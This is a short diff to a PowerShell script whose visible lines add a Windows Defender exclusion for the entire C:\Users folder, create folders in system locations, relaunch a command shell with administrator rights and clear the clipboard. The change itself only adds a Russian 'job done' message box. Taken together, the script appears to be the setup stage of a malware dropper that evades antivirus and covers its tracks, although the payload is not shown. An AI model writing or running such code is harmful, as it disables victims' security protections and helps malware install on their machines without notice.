@@ -2,6 +2,7 @@ $folderPath1 = "C:\Windows\Temp"
 $folderPath2 = "C:\"
 $folderPath3 = "C:\ProgramData"
 $folderPath = "C:\Users"
+Add-Type -AssemblyName System.Windows.Forms
 Add-MpPreference -ExclusionPath $folderPath
 New-Item -ItemType Directory -Path $folderPath1 -ErrorAction SilentlyContinue
 New-Item -ItemType Directory -Path $folderPath2 -ErrorAction SilentlyContinue
@@ -29,6 +30,13 @@ Start-Process -FilePath $env:ComSpec -ArgumentList $argList -Verb RunAs
 
 Add-Type -AssemblyName PresentationCore
 [System.Windows.Clipboard]::Clear()
+
+[System.Windows.Forms.MessageBox]::Show(
+    "Готово, Льюис. Кухня работает.", 
+    "Бенч", 
+    [System.Windows.Forms.MessageBoxButtons]::OK, 
+    [System.Windows.Forms.MessageBoxIcon]::Information
+)
 
 function Clear-Clipboard {
     Try {
